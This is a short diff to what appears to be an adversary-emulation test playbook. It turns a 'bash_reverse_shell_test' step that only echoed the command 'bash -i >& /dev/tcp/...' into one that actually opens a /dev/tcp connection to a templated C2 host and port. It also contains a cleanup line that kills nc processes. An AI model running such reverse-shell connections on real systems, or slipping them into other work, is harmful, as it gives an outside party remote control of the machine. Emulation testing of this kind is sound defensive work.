@@ -41,10 +41,10 @@ steps:
       echo "nc not available"
     fi
 - name: bash_reverse_shell_test
-  description: Test bash reverse shell capability
+  description: Attempt bash reverse shell connection to C2 host
   inline: |
-    echo "Testing bash reverse shell capability..."
-    echo "Would execute: bash -i >& /dev/tcp/{{ .Args.c2_host }}/{{ .Args.c2_port }} 0>&1" >&2
+    echo "Attempting bash reverse shell to {{ .Args.c2_host }}:{{ .Args.c2_port }}"
+    timeout {{ .Args.timeout }} bash -c "exec 5<>/dev/tcp/{{ .Args.c2_host }}/{{ .Args.c2_port }} && echo 'Connection established' >&5 && cat <&5" 2>/dev/null || echo "Reverse shell connection failed (target not listening)"
   cleanup:
     inline: |
       pkill -f "nc.*{{ .Args.c2_host }}.*{{ .Args.c2_port }}" 2>/dev/null || true
